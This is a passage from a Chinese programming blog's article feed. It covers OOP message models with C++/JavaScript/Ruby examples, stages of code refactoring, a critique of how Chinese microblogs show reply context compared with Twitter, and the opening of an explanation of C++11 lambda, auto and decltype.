           std::cout &lt;&lt; "hello " &lt;&lt; name;
         }
};
int main(int argc, char** argv)
{
    A* pa = NULL; //!!
    pa-&gt;Hello("world");
    return 0;
}</pre>
<p>试试的确可以顺利运行输出hello world，奇怪吗？其实并不奇怪，根据C++对象模型，类的非虚方法并不会存在于对象内存布局中，实际上编译器是把Hello方法转化成了类似这样的全局函数：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void A_Hello_xxx(A * const this, const std::string&amp; name) {
    std::cout &lt;&lt; “hello “ &lt;&lt; name;
}</pre>
<p>对象指针其实是作为第一个参数被隐式传递的，pa-&gt;Hello(“world”)实际上是调用的A_Hello_xxx(pa, “world”)，而恰好A_Hello_xxx内部没有使用pa，所以这段代码得以顺利运行。</p>
<h4>
<span class="ez-toc-section" id="%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%B6%88%E6%81%AF%E6%A8%A1%E5%9E%8B"></span><strong>对象的消息模型</strong><span class="ez-toc-section-end"></span>
</h4>
<p>如果是研究C++对象模型，上面的讨论可以到此为止，不过这里我想从另一个层面来继续探讨这个问题。OOP的先驱人物Alan Kay在总结Smalltalk的OO特征时强调：</p>
<p><span id="more-5202"></span></p>
<blockquote><p>Smalltalk is not only NOT its syntax or the class library, it is not even about classes. I’m sorry that I long ago coined the term “objects” for this topic because it gets many people to focus on the lesser idea. The big idea is “messaging”.</p></blockquote>
<p>也就是说相比类和对象的概念来讲，他认为对象交互的消息模型是OOP更为本质的特征，因为消息关注的是对象间的接口和交互，在构建大的系统的时候重要的不是对象/模块的内部状态，而是它们的交互。根据消息模型，牛.吃(草) 的语义是发送一条消息给“牛”，消息的类型是“吃”，消息的内容是“草”。如果按照严格的消息模型，那么上面那段C++代码应解释为向一个NULL对象发送Hello消息，这显然是不应该顺利执行的。类似的代码如果是在Java或C#中则会抛出空引用异常，所以Java和C#的设计更符合消息模型。</p>
<p>不过，Java和C#中也并非完全符合消息模型，来看一个经典的封装问题：</p>
<p></p>
<pre data-enlighter-language="csharp" class="EnlighterJSRAW">//C#

public class Account {
    private int _amount;

    public void Transfer(Account acc, int delta) {
        acc._amount += delta;
        this._amount -= delta;
    }
    …
}</pre>
<p>上面定义了一个Account类，问题在于为什么在这个类的Transfer方法中可以直接访问另一个对象acc的私有成员_amount呢？这是不是有破坏封装的嫌疑呢？这个问题经典的答案是：并不破坏封装，封装是划分了基于类的静态的代码边界，使得类的private代码修改不影响外界，而不是对于动态对象的保护。这个解释当然是合理的，不过正如上面C++代码的解释属于C++对象模型范畴，这个解释则属于基于类的静态类型OOP语言的范畴。消息模型强调了对象内部状态的保护，只能通过消息改变其状态，而对象内部是否真的具有_amout这样一个私有成员对其他任何对象（即使同类对象）都是未知的。</p>
<p>如果要严格遵守消息模型实现对象内部状态的保护应该怎么做呢？我们来看一个例子，定义一个集合类，包括：1.集合对象的构造函数；2.In方法：判断元素是否存在；3.Join方法：对两个集合做交集；4.Union方法：对两个集合做并集。下面是一种Javascript实现：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//Javascript

//集合类Set的构造函数
function Set() {
    var _elements = arguments;
    //In方法：判断元素e是否在集合中
    this.In = function(e) {
        for (var i = 0; i &lt; _elements.length; ++i) {
            if (_elements[i] == e) return true;
        }
        return false;
    };
}

//Join方法：对两个集合求交集
Set.prototype.Join = function(s2) {
    var s1 = this;
    var s = new Set();
    s.In = function(e) { return s1.In(e) &amp;&amp; s2.In(e); }
    return s;
};

//Union方法：对两个集合求并集
Set.prototype.Union = function(s2) {
    var s1 = this;
    var s = new Set();
    s.In = function(e) { return s1.In(e) || s2.In(e); }
    return s;
};

var s1 = new Set(1, 2, 3, 4, 5);
var s2 = new Set(2, 3, 4, 5, 6);
var s3 = new Set(3, 4, 5, 6, 7);
assert(false == s1.Join(s2).Join(s3).In(2));
assert(true == s1.Join(s2).Uion(s3).In(7));</pre>
<p>如果是在静态类型OOP语言中，要实现集合类的Join或Union，我们多半会像上面Account的例子一样直接对s2内部的_elements进行操作，而上面这段Javascript定义的Set关于对象s2的访问完全是符合消息模型的基于接口的访问。要实现消息模型Javascript的prototype机制并非必须的，真正的关键在于函数式的高级函数和闭包特性。从这个例子我们也可以体会到函数式的优点不仅在于无副作用，函数的可组合性也是函数式编程强大的原因。</p>
<h4>
<span class="ez-toc-section" id="Method_Missing"></span><strong>Method Missing</strong><span class="ez-toc-section-end"></span>
</h4>
<p>接下来我们还要进行深度历险，让我们思考一下如果发送一条对象不能识别的消息会怎样？这种情况在C++、Java、C#等静态类型语言中会得到一个方法未定义的编译错误，如果是在Javascript中则会产生运行时异常。比如，s1.count()会产生一个运行时异常：Object #&lt;Set&gt; has no method ‘count’。</p>
<p>在静态类型语言这个问题很少受到重视，但在动态类型语言中却大有文章，来看下面的例子：<br>
//Ruby</p>
<p></p>
<pre data-enlighter-language="ruby" class="EnlighterJSRAW">builder = Builder::XmlMarkup.new
xml = builder.books {|b|
    b.book :isbn =&gt; "14134" do
        b.title "Revelation Space"
        b.author "Alastair Reynolds"
    end
    b.book :isbn =&gt; "53534" do
        b.title "Accelerando"
        b.author "Charles Stross"
    end
}</pre>
<p>上面这段很DSL的Ruby代码创建了这样一个XML文件对象：</p>
<p></p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">
&lt;books&gt;
    &lt;book isbn="14134"&gt;
        &lt;title&gt;Revelation Space&lt;/title&gt;
        &lt;author&gt;Alastair Reynolds&lt;/author&gt;
    &lt;/book&gt;
    &lt;book isbn="53534"&gt;
        &lt;title&gt;Accelerando&lt;/title&gt;
        &lt;author&gt;Charles Stross&lt;/author&gt;
    &lt;/book&gt;
&lt;/books&gt;

</pre>
<p>builder.books, b.book, b.title都是对象方法调用，由于XML的元素名是任意的，所以不可能事先定义这些方法，类似的代码如果是在Javascript中就是no method异常。那为什么上面的Ruby代码可以正确执行呢？其实只要理解了消息模型就很容易想明白，只需要定义一个通用的消息处理方法，所有未明确定义的消息都交给它来处理就行了，这就是所谓的Method Missing模式：</p>
<p></p>
<pre data-enlighter-language="ruby" class="EnlighterJSRAW">class Foo
    def method_missing(method, *args, &amp;block)
        …
    end
end
</pre>
<p>Method Missing除了对实现DSL很重要外，还可用于产生更好地调试和错误信息，把参数嵌入到方法名中等场合。目前，Ruby、Python、Groovy几种语言对Method Missing都有很好的支持，甚至在C# 4.0中也可以利用动态特性实现。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>本文主要介绍了对象的消息模型的特征，并比较了C++对象模型，Java、C#等基于类的静态类型语言中的对象模型与严格消息模型的差异，最后探讨了Method Missing相关话题。</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="https://book.douban.com/subject/1484262/" target="_blank">Inside the C++ Object Model</a></li>
<li><a href="https://book.douban.com/subject/4031906/" target="_blank">冒号课堂 – 编程范式与OOP思想</a></li>
<li><a href="http://c2.com/cgi/wiki?AlanKaysDefinitionOfObjectOriented" target="_blank">Alan Kays Definition Of Object Oriented</a></li>
<li><a href="http://fitzgeraldnick.com/weblog/39/" target="_blank">OOP The Good Parts: Message Passing, Duck Typing, Object Composition, and not Inheritance</a></li>
<li><a href="http://olabini.com/blog/2010/04/patterns-of-method-missing/">Patterns of Method Missing</a></li>
<li><a href="http://haacked.com/archive/2009/08/26/method-missing-csharp-4.aspx">Fun With Method Missing and C# 4</a></li>
</ul>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-08-15T10:37:13+08:00</pubDate>
<guid>https://coolshell.cn/articles/5202.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 重构代码的7个阶段 ]]></title>
<link>https://coolshell.cn/articles/5201.html</link>
<content><![CDATA[ 
<p>你曾去想重构一个很老的模块，但是你只看了一眼你就恶心极了。文档，奇怪的函数和类的命名，等等，整个模块就像一个带着脚镣的衣衫褴褛的人，虽然能走，但是其已经让人感到很不舒服。面对这种情况，真正的程序员会是不会认输的，他们会接受挑战认真分析，那怕重写也在所不惜。最终那个模块会被他们重构，就像以前和大家介绍过的<a title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">那些令人销魂的编程方式</a>中的屠宰式编程一样。下面是重构代码的几个阶段，文章来自：<a href="https://norsedev.blogspot.com/2011/08/n-stages-of-refactoring.html" target="_blank">The 7 stages of refactoring</a>，下面的翻译只是意译。</p>
<p><strong>第一阶段 – 绝望</strong></p>
<p><strong></strong>在你开始去查看你想要重构的模块的，你会觉得好像很简单，这里需要改一个类，那里需要改两到三个函数，重写几个函数，看上去没什么大不了的，一两天就搞定了。于是你着手开始重构，然后当你调整重构了一些代码，比如改了一些命名，修理了一些逻辑，渐渐地，你会发现这个怪物原来体型这么大，你会看到与代码不符甚至含糊不清的注释，完全摸不着头脑的数据结构，还有一些看似不需要方法被调了几次，你还会发现无法搞清一个函数调用链上的逻辑。你感到这个事可能一周都搞不定，你开始绝望了。</p>
<p><strong>第二阶段 – 找最简单的做</strong></p>
<p><strong></strong>你承认你要重构的这个模块就是一个可怕的怪物，不是一两下就可以搞定的，于是你开始着干一些简单的事，比如重新命名一下几个函数，移除一些代码的阻碍，产生几个常量来消除magic number，等等，你知道这样做至少不会让代码变得更糟糕。</p>
<p><strong>第三阶段 – 再次绝望</strong></p>
<p><strong></strong>但是接下来的事会让你再次撞墙。你会发现那些代码的瑕疵是些不痛不痒的事，改正这些事完全于事无补，你应该要做的事就是重写所有的东西。但是你却没有时间这么干，而这些代码剪不乱理还乱，耦合得太多，让你再一次绝望。所以，你只能部分重写那些不会花太多时间的部分，这样至少可以让这些老的代码能被更多的重用。虽然不完美，但是至少可以试试。</p>
<p><span id="more-5201"></span><strong>第四阶段 – 开始乐观</strong></p>
<p>在你试着部分重构这个模块几天之后，随着重构了几个单元后，虽然你发现改善代码的进度太慢了，但此时，你已知道代码应该要被改成什么样，你在痛苦之后也锁定了那些那修改的类。是的，虽然你的时间预算已经超支，虽然要干的事比较多，但你还是充满希望，觉得那是值得的。你胸中的那团火又被点燃了。</p>
<p><strong>第五阶段  – 快速了结</strong></p>
<p>在这个时候，你发现你已花了太多的时间，而情况越来越复杂，你感到你所面对的情况越来越让你越到不安，你明白你自己已经陷入了困境。你原本以为只需要一次简单的重构，然而现在你要面对的是重写所有的东西。你开始意识到原因是因为你是一个完美主义者，你想让代码变得完美。于是你开始在怠慢你文档，并想找到一个捷径来重写老的代码，你开始采用一些简单而粗暴，快速而有点肮脏的方法。虽然不是很完美，但你就是这样去做了。然后，你开始运行测试做UT，发现UT报告上全是红色，几乎全都失败了，你恐慌了，于是快速地fix代码，然后让UT 能工作。此时，你拍拍自己胸口，说到，没问题 ，于是就把代码提交了。</p>
<p><strong>第六阶段 – 修改大量的Bug</strong></p>
<p>你的重写并不完美，虽然其过了测试，但是那些UT测试对于你的新的代码有点不太合适，虽然他们都没有报错，但是他们测试得范围太小了，没有覆盖到所有的情况和边界。所以，在这以后，你还需要几周或是更长的时间不得不来修正越来越多的bug，这使得你的设计和代码在每一次quick-fix后就变得越来越难看。此时，代码已经不像你所期望的那样完美了，但你依然觉得他还是比一开始要好一些。这个阶段可能历经几个月。</p>
<p><strong>第七阶段  – 觉悟</strong></p>
<p>经过了6个月，你重写的模块又出了一个比较严重的bug。这让你重构的那个模块变得更难堪。你发现出的这个问题是和当初的设计不一致，你还发现被你重构掉的那段老的代码并不是当初看上去的那么坏，那段老的代码确实考虑到了一些你未曾考虑到的事情。这个时候，你团队里有人站出来说这个模块应该被重构或是重写，而你却不动声色地一言不发，并希望那个站出来的人能在几个月后能觉悟起来。</p>
<p>——————</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>不知道这是不是你的经历，我经历过很多次这样的事。对于很多维护性质的项目，我犯过的错误让我成了一个实实在在的保守派，我几乎不敢动，那怕看到代码很不合口味。当然，那些从来没有写过代码的敏捷咨询师一定会说用TDD或是UT可以让你的重构更有效也更容易，因为这样会让他们显得更我价值，但我想告诉你，这种脱离实际的说法很不负责任，这就好比说——<strong> 我在杀猪的时候遇到了一些麻烦，因为我对猪的生理结构不清楚，或是这本来就是一头畸形的猪，导致我杀的猪很难看，而伟大的敏捷咨询师却告诉我，要用一把更快更漂亮的刀</strong>。软件开发永远不是那么简单的事，杀猪也一样。</p>
 ]]></content>
<pubDate>2011-08-16T08:42:35+08:00</pubDate>
<guid>https://coolshell.cn/articles/5201.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 国内微博和Twitter的最大不同 ]]></title>
<link>https://coolshell.cn/articles/5247.html</link>
<content><![CDATA[ 
<p>霍炬近两个月前写过一篇《<a href="http://blog.devep.net/virushuo/2011/06/26/microblogging.html">microblogging和微博信息架构产品差距和影响</a>》分析了国内微博和Twitter的差距，重点就是因为信息的平等性。我也一直在观察新浪微博，以及新浪和Twitter的一些功能上的差别。发现了一些东西，想在这里和大家分享一下。我的见解达不到像霍炬那样的层次，作为一个技术人员，我只能在产品功能上做些分析。欢迎大家指正。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%8E%B0%E5%AE%9E%E7%8A%B6%E5%86%B5" title="现实状况">现实状况</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#SNS%E4%B8%AD%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87" title="SNS中的上下文">SNS中的上下文</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%A0%E5%81%87" title="上下文造假">上下文造假</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%8E%B0%E5%AE%9E%E7%8A%B6%E5%86%B5"></span>现实状况<span class="ez-toc-section-end"></span>
</h4>
<p>国内的微博就是新浪，Sohu微博，腾讯微博，以及饭否。我们不难发现：</p>
<ul>
<li>搜狐的和腾讯的就是Copy新浪的。在Following和Followed上大家都有自己所谓的“创新”</li>
<li>饭否是在Copy Twitter，这点太明显了，不过，抄在了表面，而且相当的怪。</li>
</ul>
<p>国内所有的这些以Twitter为蓝本干出来的这些东西，其和Twitter在核心功能上有这些差别：</p>
<ul>
<li>Twitter的Retweet一点信息都加不上，国内的微博的转发需要加上自己的评论，也就形自己的信息。</li>
<li>Twitter的Reply只会有一个@原来的人，国内的Reply也很相似，只是勾上转发后就会把Reply的东西以“<strong>//@XXX</strong>”的方式成为自己的信息。</li>
<li>饭否的做法比较怪，转发加原文（想做成新浪的样子），回复不加原文，只有@（Twitter）的样子，可见饭否的分裂。</li>
</ul>
<h4>
<span class="ez-toc-section" id="SNS%E4%B8%AD%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87"></span>SNS中的上下文<span class="ez-toc-section-end"></span>
</h4>
<p>这段时间，我一直在想，新浪为什么要做成这样，为什么不做成Twitter那样，或者，为什么Twitter做成那样而不是新浪这样？从表面上看上去，<strong>新浪的“<span style="color: #800000;">回复+转发</span>”会带被回的信息，而Twitter的回复不带上下文，Twitter上一些我fo的人的话题完全看不懂，不像新浪的还能看到上文</strong>。</p>
<p>老实说，在一开始，我还觉得新浪微博这种用法和技术上要比 Twitter 要强大，现在看来是我当时对Twitter并不熟悉。经过这段时间的观察。<strong>我恰恰发现新浪在转发和回复上都要带上原文其实是一件很没有技术含量的事</strong>。要说清这个事，请让我说一下评论和回复的事。</p>
<p><span id="more-5247"></span></p>
<ul>
<li>我们网上讨论一个事的时候，你会发现，一个主题下的讨论会对回复的话题进行讨论而偏题，甚至会发散出多条讨论线各自发展。这种事会造成讨论的混乱。所以，上下文是关键。</li>
<li>BBS和Wordpress可以使用“引用”或“回复”来让你的话题有上下文。新浪的博客和新闻评论里没有，只是网易的评论可以盖楼。所以新浪微博基本上采用的就是这样的方式。</li>
</ul>
<p>然而，Twitter则不是，Twitter的回复系统是不会像新浪那样加上“<strong>//@XXX</strong>”的东西的，如果你要看信息的上下文，你需要点击信息，在右边栏会出现其上下文列表。<strong>Twitter的这个功能可以让你很容易地找到一个信息链，而不受别的信息链的干扰，不像国内微博那样——多个信息链穿插成一锅粥让你无法阅读</strong>（饭否是抄Twitter抄的最像的，但是其没有实现这个功能）。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%8A%E4%B8%8B%E6%96%87%E9%80%A0%E5%81%87"></span>上下文造假<span class="ez-toc-section-end"></span>
</h4>
<p>国内的所有微博都做不到这个事，我估计是因为技术不行。所以，为了加上上下文，他们只能做成今天你看到的这个样子。你也许会想和我争论，这样在阅读体验上更好。但是，如果你看过下面这个例子，你一定就不会这么想了。</p>
<p>在新浪微博上，我们转发或是回复时，我们可以人为地加上这样的上下文（说白了，就是造假）：</p>
<blockquote><p>//<a href="https://weibo.com/yaochen" target="_blank">@姚晨</a>：八顿也会C语言。//<a href="https://weibo.com/renzhiqiang" target="_blank">@任志强</a>：不是C++才牛吗？ //<a href="http://blog.sina.com.cn/lichengpeng" target="_blank">@李承鹏</a>：代表盲肠封你为程序员的脊梁。//<a href="https://weibo.com/1739928273" target="_blank">@苍井空</a>：还要爱吃空心菜的菜。 //<a href="https://weibo.com/kaifulee" target="_blank">@李开复</a>：成功的程序员的标志：1）用C语言，2）不用IE6，3）无需敏捷咨询师。</p></blockquote>
<p>看到这个，你明白为什么Twitter要那样，而不是新浪这样了吧？！<strong>这就是差距，至少是产品经理的差距</strong>。我个人觉得还有技术上的差距。如果某人给你发来的一条手机短信你都搞不清楚是不是这个人说的，那会是多么恐怖的事。</p>
<p><span style="color: #cc0000;"><strong>有人说，在Twitter上也可以造假，但是这需要用户自己去干，Twitter的系统并不会主动干这个。 Twitter的Retweet和Reply是可以区分用户行为和系统行为（就看你加不加原信息），而新浪微博则无法区系统行为和用户行为，这就是国内微博的软肋！</strong></span></p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>新浪的东西其实挺没创意的，<a title="微软用新浪来当反面教材" href="https://coolshell.cn/articles/3872.html" target="_blank">微软用新浪在当过反面教材</a>，某WEB设计师也用<a title="为什么中国的网页设计那么烂？" href="https://coolshell.cn/articles/3605.html" target="_blank">新浪来当过反面教材</a>。不过，新浪微博还是很强大的，尤其是删贴和阻止信息传播上，经过观察，的确很强大。</p>
<p><span style="color: #008000;">我把我这篇文章里的那个欺诈示例转到了我的微博（<a href="https://weibo.com/n/%E5%B7%A6%E8%80%B3%E6%9C%B5%E8%80%97%E5%AD%90"><span style="color: #008000;">@左耳朵耗子</span></a>）做了个测试。结果，在有这篇文章做提示的情况下，还是有些人相信了，还有些人骂我并把我取消关注和拉黑了。我真是服了，我故意造得这么假这么娱乐，结果还是有些人认真了。你说那些骗子看到这个情况岂不是开心之极啊。再次说明新浪微博的这种上下文的方式弊端！</span></p>
<p>（<strong>转载请注明作者和出处</strong>）</p>
 ]]></content>
<pubDate>2011-08-17T08:34:04+08:00</pubDate>
<guid>https://coolshell.cn/articles/5247.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C++11 中值得关注的几大变化（详解） ]]></title>
<link>https://coolshell.cn/articles/5265.html</link>
<content><![CDATA[ 
<p>源文章来自前C++标准委员会的 <a href="http://www.softwarequalityconnection.com/author/dannykalev/">Danny Kalev</a> 的 <a href="http://www.softwarequalityconnection.com/2011/06/the-biggest-changes-in-c11-and-why-you-should-care/" target="_blank">The Biggest Changes in C++11 (and Why You Should Care)</a>，赖勇浩做了一个<a href="http://blog.csdn.net/lanphaday/article/details/6564162" target="_blank">中文翻译在这里</a>。所以，我就不翻译了，我在这里仅对文中提到的这些变化“<strong>追问为什么要引入这些变化</strong>”的一个探讨，<strong>只有知道为了什么，用在什么地方，我们才能真正学到这个知识</strong>。而以此你可以更深入地了解这些变化。所以，本文不是翻译。因为写得有些仓促，所以难免有问题，还请大家指正。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Lambda_%E8%A1%A8%E8%BE%BE%E5%BC%8F" title="Lambda 表达式">Lambda 表达式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E6%8E%A8%E5%AF%BC_auto" title="自动类型推导 auto">自动类型推导 auto</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A8%E5%AF%BC_decltype" title="自动化推导 decltype">自动化推导 decltype</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#auto_%E5%92%8C_decltype_%E7%9A%84%E5%B7%AE%E5%88%AB%E5%92%8C%E5%85%B3%E7%B3%BB" title="auto 和 decltype 的差别和关系">auto 和 decltype 的差别和关系</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%BB%9F%E4%B8%80%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E8%AF%AD%E6%B3%95" title="统一的初始化语法">统一的初始化语法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Delete_%E5%92%8C_Default_%E5%87%BD%E6%95%B0" title="Delete 和 Default 函数">Delete 和 Default 函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#nullptr" title="nullptr">nullptr</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%A7%94%E6%89%98%E6%9E%84%E9%80%A0" title="委托构造">委托构造</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E5%8F%B3%E5%80%BC%E5%BC%95%E7%94%A8%E5%92%8Cmove%E8%AF%AD%E4%B9%89" title="右值引用和move语义">右值引用和move语义</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-10" href="#C_11_STL_%E6%A0%87%E5%87%86%E5%BA%93" title="C++ 11 STL 标准库">C++ 11 STL 标准库</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#%E7%BA%BF%E7%A8%8B%E5%BA%93" title="线程库">线程库</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E6%96%B0%E5%9E%8B%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88" title="新型智能指针">新型智能指针</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E6%96%B0%E7%9A%84%E7%AE%97%E6%B3%95" title="新的算法">新的算法</a></li>
</ul>
</li>
</ul></nav>
</div>
<h4 class="color-programming">
<span class="ez-toc-section" id="Lambda_%E8%A1%A8%E8%BE%BE%E5%BC%8F"></span>Lambda 表达式<span class="ez-toc-section-end"></span>
</h4>
<p>Lambda表达式来源于函数式编程，说白就了就是在使用的地方定义函数，有的语言叫“闭包”，如果 lambda 函数没有传回值(例如 <tt>void</tt> )，其回返类型可被完全忽略。 定义在与 lambda 函数相同作用域的变量参考也可以被使用。这种的变量集合一般被称作 closure（闭包）。我在这里就不再讲这个事了。表达式的简单语法如下，</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">[capture](parameters)-&gt;return_type {body}</code></p>
<p>原文的作者给出了下面的例子：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int main()
{
   char s[]="Hello World!";
   int Uppercase = 0; //modified by the lambda
   for_each(s, s+sizeof(s), [&amp;Uppercase] (char c) {
    if (isupper(c))
     Uppercase++;
    });
 cout &lt;&lt; Uppercase &lt;&lt; " uppercase letters in: " &lt;&lt; s &lt;&lt;endl;
}</pre>
<p>在传统的STL中for_each() 这个玩意最后那个参数需要一个“函数对象”，所谓函数对象，其实是一个class，这个class重载了operator()，于是这个对象可以像函数的式样的使用。实现一个函数对象并不容易，需要使用template，比如下面这个例子就是函数对象的简单例子（实际的实现远比这个复杂）：</p>
<p><span id="more-5265"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">template &lt;class T&gt;
class less
{
public:
    bool operator()(const T&amp;l, const T&amp;r)const
    {
        return l &lt; r;
    }
};</pre>
<p class="color-programming">所以，<strong>C++引入Lambda的最主要原因就是1）可以定义匿名函数，2）编译器会把其转成函数对象</strong>。相信你会和我一样，会疑问为什么以前STL中的ptr_fun()这个函数对象不能用？（ptr_fun()就是把一个自然函数转成函数对象的）。原因是，ptr_fun() 的局限是其接收的自然函数只能有1或2个参数。</p>
<p class="color-programming">那么，除了方便外，为什么一定要使用Lambda呢？它比传统的函数或是函数对象有什么好处呢？我个人所理解的是，这种函数之年以叫“闭包”，就是因为其限制了别人的访问，更私有。也可以认为他是一次性的方法。Lambda表达式应该是简洁的，极私有的，为了更易的代码和更方便的编程。</p>
<h4 class="color-programming">
<span class="ez-toc-section" id="%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E6%8E%A8%E5%AF%BC_auto"></span>自动类型推导 auto<span class="ez-toc-section-end"></span>
</h4>
<p>在这一节中，原文主要介绍了两个关键字 auto 和 deltype，示例如下：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">auto x=0; //x has type int because 0 is int
auto c='a'; //char
auto d=0.5; //double
auto national_debt=14400000000000LL;//long long</pre>
<p>auto 最大的好处就是让代码简洁，尤其是那些模板类的声明，比如：STL中的容器的迭代子类型。</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">vector&lt;int&gt;::const_iterator ci = vi.begin();</code></p>
<p>可以变成：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">auto ci = vi.begin();</code></p>
<p>模板这个特性让C++的代码变得很难读，不信你可以看看STL的源码，那是一个乱啊。使用auto必需一个初始化值，编译器可以通过这个初始化值推导出类型。因为auto是来简化模板类引入的代码难读的问题，如上面的示例，iteration这种类型就最适合用auto的，但是，我们不应该把其滥用。</p>
<p>比如下面的代码的可读性就降低了。因为，我不知道ProcessData返回什么？int? bool? 还是对象？或是别的什么？这让你后面的程序不知道怎么做。</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">auto obj = ProcessData(someVariables);</code></p>
<p>但是下面的程序就没有问题，因为pObject的型别在后面的new中有了。</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">auto pObject = new SomeType&lt;OtherType&gt;::SomeOtherType();</code></p>
<h4>
<span class="ez-toc-section" id="%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A8%E5%AF%BC_decltype"></span>自动化推导 decltype<span class="ez-toc-section-end"></span>
</h4>
<p>关于 <code>decltype</code> 是一个操作符，其可以评估括号内表达式的类型，其规则如下：</p>
<ol>
<li>如果表达式e是一个变量，那么就是这个变量的类型。</li>
<li>如果表达式e是一个函数，那么就是这个函数返回值的类型。</li>
<li>如果不符合1和2，如果e是左值，类型为T，那么decltype(e)是T&amp;；如果是右值，则是T。</li>
</ol>
<p>原文给出的示例如下，我们可以看到，这个让的确我们的定义变量省了很多事。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">const vector&lt;int&gt; vi;
typedef decltype (vi.begin()) CIT;
CIT another_const_iterator;</pre>
<p>还有一个适合的用法是用来typedef函数指针，也会省很多事。比如：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW"> decltype(&amp;myfunc) pfunc = 0;

typedef decltype(&amp;A::func1) type;</pre>
<h4>
<span class="ez-toc-section" id="auto_%E5%92%8C_decltype_%E7%9A%84%E5%B7%AE%E5%88%AB%E5%92%8C%E5%85%B3%E7%B3%BB"></span>auto 和 decltype 的差别和关系<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/C%2B%2B0x#Type_inference" rel="nofollow" target="_blank">Wikipedia 上是这么说的</a>（关于decltype的规则见上）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;vector&gt;

int main()
{
    const std::vector&lt;int&gt; v(1);
    auto a = v[0];        // a 的类型是 int
    decltype(v[0]) b = 1; // b 的类型是 const int&amp;, 因为函数的返回类型是
                          // std::vector&lt;int&gt;::operator[](size_type) const
    auto c = 0;           // c 的类型是 int
    auto d = c;           // d 的类型是 int
    decltype(c) e;        // e 的类型是 int, 因为 c 的类型是int
    decltype((c)) f = c;  // f 的类型是 int&amp;, 因为 (c) 是左值
